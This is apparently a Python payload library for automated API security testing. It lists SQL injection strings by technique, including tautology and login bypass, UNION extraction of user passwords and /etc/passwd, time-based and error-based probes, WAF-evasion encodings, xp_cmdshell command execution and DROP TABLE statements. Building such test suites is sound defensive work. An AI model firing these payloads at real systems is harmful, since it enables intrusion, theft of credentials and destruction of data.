"""
SQL Injection payload library.

This module contains reusable SQL injection payloads grouped by
attack technique.

Keeping payloads separate from test execution makes it easier to:

    - Add new payloads
    - Reuse payloads across multiple APIs
    - Expand security coverage
    - Maintain attack categories independently

Categories:
    - CLASSIC_SQLI_PAYLOADS          : Basic tautology / bypass
    - COMMENT_STYLE_SQLI_PAYLOADS    : Comment-based evasion
    - UNION_SQLI_PAYLOADS            : UNION SELECT data extraction
    - TIME_BASED_SQLI_PAYLOADS       : Blind inference via delay
    - BOOLEAN_BLIND_PAIRS            : TRUE/FALSE response comparison
    - ERROR_BASED_SQLI_PAYLOADS      : DB error leak via functions
    - ENCODING_OBFUSCATION_PAYLOADS  : WAF evasion via encoding
    - LOGIN_BYPASS_CREDENTIALS       : Auth bypass credential pairs
"""


# ============================================================================
# CLASSIC SQL INJECTION PAYLOADS
# ============================================================================

CLASSIC_SQLI_PAYLOADS = [

    # Basic tautology
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    '" OR "1"="1',
    "' OR 1=1#",

    # Admin bypass
    "admin' --",
    "admin'/*",

    # Statement termination + injection
    "'; DROP TABLE users; --",
    "1; SELECT * FROM users--",
    "' OR 1=1 LIMIT 1 --",

    # Existence checks
    "' OR EXISTS(SELECT 1)--",
    "' OR EXISTS(SELECT * FROM users)--",

    # Double-quote variants
    '" OR 1=1--',
    '" OR ""="',

    # Null byte
    "'%00",

    # Mixed case evasion
    "' oR '1'='1",
    "' Or 1=1--",

]


# ============================================================================
# COMMENT STYLE SQL INJECTION PAYLOADS
# ============================================================================

COMMENT_STYLE_SQLI_PAYLOADS = [

    # Standard comment styles
    "' OR '1'='1' /*",
    "' OR '1'='1'#",
    "' OR '1'='1'-- -",

    # Inline comment obfuscation
    "'/**/OR/**/'1'='1",
    "'/**/OR/**/1=1--",
    "'/*!OR*/1=1--",

    # Bracket-wrapped
    "') OR ('1'='1",
    "')) OR (('1'='1",

    # Multi-line comment
    "'\n OR 1=1--",

    # MySQL conditional comment
    "' /*!50000OR*/ '1'='1",

]


# ============================================================================
# UNION BASED SQL INJECTION PAYLOADS
# ============================================================================

UNION_SQLI_PAYLOADS = [

    # Column count probing (NULL padding)
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL--",

    # Sensitive table data extraction
    "' UNION SELECT username, password FROM users--",
    "' UNION SELECT user, password FROM mysql.user--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION ALL SELECT table_name,column_name FROM information_schema.columns--",

    # DB introspection
    "' UNION SELECT user(),version(),database()--",
    "' UNION SELECT @@version,NULL--",
    "' UNION SELECT @@datadir,NULL--",

    # MSSQL specific
    "'; EXEC xp_cmdshell('whoami')--",

    # File read (MySQL)
    "' UNION SELECT load_file('/etc/passwd'),NULL--",

]


# ============================================================================
# TIME BASED SQL INJECTION PAYLOADS
# ============================================================================

TIME_BASED_SQLI_PAYLOADS = [

    # MySQL
    "' OR SLEEP(5)-- ",
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(5000000,MD5(1))--",

    # MSSQL
    "'; WAITFOR DELAY '0:0:05'--",
    "'; WAITFOR DELAY '0:0:03'--",

    # PostgreSQL
    "'; SELECT pg_sleep(5)--",
    "' OR 1=1;SELECT pg_sleep(5)--",

    # Oracle
    "' OR 1=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",

    # Generic (zero-delay, safe probe)
    "' AND SLEEP(0)--",

]


# ============================================================================
# BOOLEAN BASED BLIND SQL INJECTION PAYLOAD PAIRS
# ============================================================================

BOOLEAN_BLIND_PAIRS = [

    # Numeric condition
    (
        "' AND 1=1-- ",
        "' AND 1=2-- ",
    ),

    # String condition
    (
        "' OR 'a'='a",
        "' OR 'a'='b",
    ),

    # Subquery exists
    (
        "' AND (SELECT 1 FROM users LIMIT 1)=1--",
        "' AND (SELECT 1 FROM users LIMIT 1)=0--",
    ),

    # String length probe
    (
        "' AND LENGTH(database())>0--",
        "' AND LENGTH(database())>999--",
    ),

    # MSSQL system object
    (
        "' AND (SELECT COUNT(*) FROM sysobjects)>=0--",
        "' AND (SELECT COUNT(*) FROM sysobjects)<0--",
    ),

]


# ============================================================================
# ERROR BASED SQL INJECTION PAYLOADS
# ============================================================================

ERROR_BASED_SQLI_PAYLOADS = [

    # MySQL — extractvalue
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT database())))--",

    # MySQL — updatexml
    "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",

    # MySQL — floor/rand group-by
    (
        "' AND (SELECT 1 FROM("
        "SELECT COUNT(*),CONCAT((SELECT version()),"
        "floor(rand(0)*2))x FROM information_schema.tables "
        "GROUP BY x)a)--"
    ),

    # MSSQL — conversion error
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
    "' AND 1=CONVERT(int,@@version)--",

    # PostgreSQL — cast error
    "' AND 1=CAST((SELECT version()) AS int)--",
    "' AND 1=CAST((SELECT current_database()) AS int)--",

    # Oracle — heavyweight error
    "' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--",

    # Generic division by zero
    "' AND 1/0=1--",

]


# ============================================================================
# ENCODING / OBFUSCATION SQL INJECTION PAYLOADS
# ============================================================================

ENCODING_OBFUSCATION_PAYLOADS = [

    # URL-encoded single quote
    "%27 OR 1=1--",
    "%27 OR %271%27=%271",

    # Double URL-encoded
    "%2527 OR 1=1--",

    # HTML entity encoded
    "&#39; OR 1=1--",

    # Unicode encoded quote
    "\u0027 OR 1=1--",

    # Hex string (MySQL CHAR)
    "CHAR(39) OR CHAR(49)=CHAR(49)",

    # Concatenation bypass
    "'||' OR '1'='1",
    "'+'OR+'1'='1",

    # Whitespace substitution (tab/newline)
    "'\tOR\t1=1--",
    "'\rOR\r1=1--",

    # Comment interspersed
    "'/*comment*/OR/*comment*/1=1--",

]


# ============================================================================
# LOGIN BYPASS CREDENTIAL PAIRS
# ============================================================================

LOGIN_BYPASS_CREDENTIALS = [

    # Classic comment truncation
    {"username": "admin' --", "password": "anything"},
    {"username": "admin'/*", "password": "x"},

    # Tautology
    {"username": "admin' OR '1'='1", "password": "' OR '1'='1"},
    {"username": "' OR 1=1--", "password": ""},
    {"username": "' OR '1'='1' LIMIT 1--", "password": "x"},

    # HAVING clause
    {"username": "a' HAVING 1=1--", "password": "x"},

    # Stacked queries
    {"username": "'; DROP TABLE users; --", "password": "x"},

    # Double-quote variant
    {"username": '" OR "1"="1', "password": '" OR "1"="1'},

    # Null byte bypass
    {"username": "admin%00", "password": "anything"},

]


# ============================================================================
# TIME BASED DETECTION CONFIGURATION
# ============================================================================

TIME_BASED_THRESHOLD_SECONDS = 4.5